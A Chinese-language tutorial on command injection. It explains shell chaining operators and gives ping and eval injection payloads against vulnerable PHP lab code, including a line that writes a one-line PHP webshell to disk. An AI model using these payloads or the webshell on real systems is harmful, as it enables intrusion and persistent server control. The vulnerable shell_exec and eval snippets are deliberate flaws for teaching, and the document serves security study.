# 命令注入完全指南

## 1. 概述

命令注入是指攻击者通过构造恶意输入，使得应用程序将用户输入作为系统命令执行的漏洞。通常出现在需要调用系统命令的功能中，如ping测试、文件操作等。

---

## 2. Linux基础

### 2.1 查看文件命令

```shell
more: 一页一页的显示档案内容
less: 与more类似，优点可以往前翻页，而且可以搜索字符
head: 查看头几行
cat: 由第一行开始显示内容，并将所有内容输出
tac: 从最后一行开始显示，是cat的反向显示
tail: 查看尾几行
tailf: 类似于 tail -f
nl: 类似于 cat -n, 显示的时候顺便输出行号
od: 以二进制的方式读取档案内容，搭配 -c 参数读内容
vi/vim: 编辑器，也可以查看文件
sort: 可以查看
uniq: 可以查看
```

### 2.2 转义字符

- Windows下的转义字符为 `^`
- Linux下的转义字符为 `\`

## 3. 管道符

命令为假可以理解成命令不存在或者命令结果为假

### 3.1 Linux管道符

`;` 前面和后面命令都要执行，无论前面真假

```text
#ls ; whoami
```

`|` 直接执行后面的语句

```text
#ls | whoami
```

`||` 如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句

```text
#ls || whoami
```

`&` 前面和后面命令都要执行，无论前面真假

```text
#ls & whoami
```

`&&` 如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令

```text
#ls && whoami
```

### 3.2 Windows管道符

`|` 直接执行后面的语句

```text
#dir | whoami
```

`||` 如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句

```text
#dir || whoami
```

`&` 前面和后面命令都要执行，无论前面真假

```text
#dir & whoami
```

`&&` 如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令

```text
#dir && whoami
```

## 4. 注释符号

与代码注释一样，合理利用的时候，命令执行能够使命令后面的其他字符成为注释内容，以达到我们想要的效果。

- Windows的注释符号为 `::`，在BAT批处理脚本中用的较多
- Linux的注释符号为 `#`，在bash脚本中用的比较多

## 5. 实战案例

### 5.1 Ping命令注入

当我们输入一个IP地址就可以触发一个 ping IP地址 的操作，可以利用注入方式来执行命令。

**Payload示例**：

```shell
127.0.0.1&whoami
ipaddress=127.0.0.1|whoami&submit=ping
ipaddress=11||whoami&submit=ping
ipaddress=127.0.0.1|ipconfig&submit=ping
```

**注意事项**：
- `ipconfig`是Windows下的命令，Linux下使用`ifconfig`
- 如果`ifconfig`未安装：`apt -y install net-tools`

### 5.2 源码分析

```php
<?php
$result='';

if(isset($_POST['submit']) && $_POST['ipaddress']!=null){
    $ip=$_POST['ipaddress'];
    // 可以先拆分，然后校验数字以范围，第一位和第四位1-255，中间两位0-255
    if(stristr(php_uname('s'), 'windows')){
        $result.=shell_exec('ping '.$ip);  // 直接将变量拼接进来，没做处理
    }else {
        $result.=shell_exec('ping -c 4 '.$ip);
    }
}
?>
```

**漏洞原因**：使用POST接受数据后，直接拼接到shell_exec中，未做任何过滤。

### 5.3 Eval代码执行

如果输入phpinfo()能正常执行，说明后端使用了eval函数。

**Payload示例**：

```text
txt=phpinfo();&submit=%E6%8F%90%E4%BA%A4
txt=system("whoami");&submit=%E6%8F%90%E4%BA%A4
写入一句话：
fputs(fopen('shell.php','w'),'<?php @assert($_POST[shell]);?>');
```

### 5.4 Eval源码分析

```php
$html='';
if(isset($_POST['submit']) && $_POST['txt'] != null){
    if(@!eval($_POST['txt'])){
        $html.="<p>你喜欢的字符还挺奇怪的!</p>";
    }
}
```

**漏洞原因**：使用POST接受数据后，直接传入eval函数执行，未做任何过滤。

**注意**：代码中的`@`符号是错误抑制符，用来屏蔽eval()函数可能导致的错误和异常，但不能完全避免命令执行。
